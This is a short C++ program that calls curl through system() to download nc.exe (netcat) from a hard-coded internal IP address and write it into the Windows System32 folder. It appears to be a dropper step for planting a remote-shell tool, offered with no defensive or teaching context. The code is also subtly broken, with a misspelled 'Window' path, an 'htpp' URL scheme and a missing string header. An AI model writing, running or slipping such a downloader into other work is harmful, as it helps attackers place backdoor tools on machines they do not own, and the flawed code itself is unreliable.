#include <iostream>
using std::cout, std::system;

int main(){
    std::string curl = "C:\\Window\\System32\\curl.exe";
    std::string install_filePath = "C:\\Window\\System32\\nc.exe";
    std::string nc_url = "htpp://192.168.0.163/nc.exe";
    std::string command = curl + " " + nc_url + " --output" + " " + install_filePath; 
    system(command.c_str());
}